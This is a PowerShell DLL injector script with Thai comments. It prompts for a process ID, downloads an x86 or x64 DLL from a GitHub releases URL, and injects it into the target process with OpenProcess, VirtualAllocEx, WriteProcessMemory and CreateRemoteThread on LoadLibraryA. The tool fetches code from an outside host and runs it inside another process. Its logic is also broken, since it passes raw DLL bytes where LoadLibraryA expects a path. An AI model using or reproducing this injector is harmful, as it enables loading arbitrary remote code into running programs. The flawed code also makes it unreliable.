$dllUrl_x86 = "https://github.com/newgen319/xxx_x1/releases/download/v2/xxx_x1_x86.dll"
$dllUrl_x64 = "https://github.com/newgen319/xxx_x1/releases/download/v2/xxx_x1_x64.dll"

Write-Host "=== DLL INJECTOR DEBUG MODE ===" -ForegroundColor Cyan
Write-Host "Enter PID : " -NoNewline
$targetPid = [int](Read-Host)

# ตรวจสอบ process
try {
    $proc = Get-Process -Id $targetPid -ErrorAction Stop
    Write-Host "[1] Found process: $($proc.Name) (PID: $targetPid)" -ForegroundColor Green
    Write-Host "    Path: $($proc.Path)" -ForegroundColor Gray
} catch {
    Write-Host "[1] ERROR: Process not found!" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit
}

# ตรวจสอบ architecture
$is64BitProcess = [Environment]::Is64BitOperatingSystem
Write-Host "[2] OS is 64-bit: $is64BitProcess" -ForegroundColor Gray

# ตรวจสอบว่า process เป็น 32-bit หรือ 64-bit
$is32BitProcess = $proc.Modules | Where-Object { $_.ModuleName -eq "wow64.dll" } | ForEach-Object { $true }
if ($is32BitProcess) {
    Write-Host "[3] Target process is 32-bit (x86)" -ForegroundColor Yellow
    $dllUrl = $dllUrl_x86
    $arch = "x86"
} else {
    Write-Host "[3] Target process is 64-bit (x64)" -ForegroundColor Yellow
    $dllUrl = $dllUrl_x64
    $arch = "x64"
}

# ดาวน์โหลด DLL
Write-Host "[4] Downloading DLL ($arch) from GitHub..." -ForegroundColor Cyan
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "PowerShell")
    $dllBytes = $wc.DownloadData($dllUrl)
    Write-Host "    Downloaded: $($dllBytes.Length) bytes" -ForegroundColor Green
} catch {
    Write-Host "[4] ERROR: Download failed!" -ForegroundColor Red
    Write-Host "    URL: $dllUrl" -ForegroundColor Gray
    Read-Host "Press Enter to exit"
    exit
}

# เพิ่ม Win32 API
if (-not ([System.Management.Automation.PSTypeName]'Injector').Type) {
    Write-Host "[5] Adding Win32 API..." -ForegroundColor Cyan
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Injector {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr LoadLibrary(string lpFileName);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);
}
"@
    Write-Host "    API added successfully" -ForegroundColor Green
}

# เปิด process
Write-Host "[6] Opening process with full access..." -ForegroundColor Cyan
$hProcess = [Injector]::OpenProcess(0x1F0FFF, $false, $targetPid)
if ($hProcess -eq 0) {
    Write-Host "[6] ERROR: OpenProcess failed! Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red
    Write-Host "    Try running as Administrator" -ForegroundColor Yellow
    Read-Host "Press Enter to exit"
    exit
}
Write-Host "[6] Process opened successfully" -ForegroundColor Green

# จอง memory
Write-Host "[7] Allocating memory in target process..." -ForegroundColor Cyan
$remoteBuffer = [Injector]::VirtualAllocEx($hProcess, 0, $dllBytes.Length, 0x3000, 0x04)
if ($remoteBuffer -eq 0) {
    Write-Host "[7] ERROR: VirtualAllocEx failed! Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red
    [Injector]::CloseHandle($hProcess)
    Read-Host "Press Enter to exit"
    exit
}
Write-Host "[7] Memory allocated at: 0x$($remoteBuffer.ToString('X'))" -ForegroundColor Green

# เขียน DLL
Write-Host "[8] Writing DLL to memory..." -ForegroundColor Cyan
$bytesWritten = [UIntPtr]::Zero
$writeResult = [Injector]::WriteProcessMemory($hProcess, $remoteBuffer, $dllBytes, $dllBytes.Length, [ref] $bytesWritten)
if (-not $writeResult) {
    Write-Host "[8] ERROR: WriteProcessMemory failed!" -ForegroundColor Red
    [Injector]::CloseHandle($hProcess)
    Read-Host "Press Enter to exit"
    exit
}
Write-Host "[8] Written $($bytesWritten) bytes" -ForegroundColor Green

# สร้าง remote thread
Write-Host "[9] Creating remote thread to load DLL..." -ForegroundColor Cyan
$kernel32 = [Injector]::GetProcAddress([Injector]::LoadLibrary("kernel32.dll"), "LoadLibraryA")
$threadHandle = [Injector]::CreateRemoteThread($hProcess, 0, 0, $kernel32, $remoteBuffer, 0, 0)

if ($threadHandle -eq 0) {
    Write-Host "[9] ERROR: CreateRemoteThread failed! Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red
} else {
    Write-Host "[9] Remote thread created, waiting for LoadLibrary..." -ForegroundColor Green
    
    # รอ LoadLibrary เสร็จ
    $waitResult = [Injector]::WaitForSingleObject($threadHandle, 10000)
    
    # ตรวจสอบผล
    $exitCode = 0
    [Injector]::GetExitCodeThread($threadHandle, [ref]$exitCode)
    
    if ($exitCode -eq 0) {
        Write-Host "[10] RESULT: LoadLibrary FAILED!" -ForegroundColor Red
        Write-Host "    Possible causes:" -ForegroundColor Yellow
        Write-Host "    - DLL architecture mismatch (x86/x64)" -ForegroundColor Yellow
        Write-Host "    - DLL missing dependencies" -ForegroundColor Yellow
        Write-Host "    - DLL is corrupted" -ForegroundColor Yellow
        Write-Host "    - DllMain returned FALSE" -ForegroundColor Yellow
    } else {
        Write-Host "[10] RESULT: LoadLibrary SUCCESS!" -ForegroundColor Green
        Write-Host "    DLL loaded at address: 0x$($exitCode.ToString('X'))" -ForegroundColor Green
    }
    
    [Injector]::CloseHandle($threadHandle)
}

[Injector]::CloseHandle($hProcess)
Write-Host "[11] Cleanup complete" -ForegroundColor Cyan
Write-Host ""
Write-Host "Press Enter to exit..." -ForegroundColor Gray
Read-Host
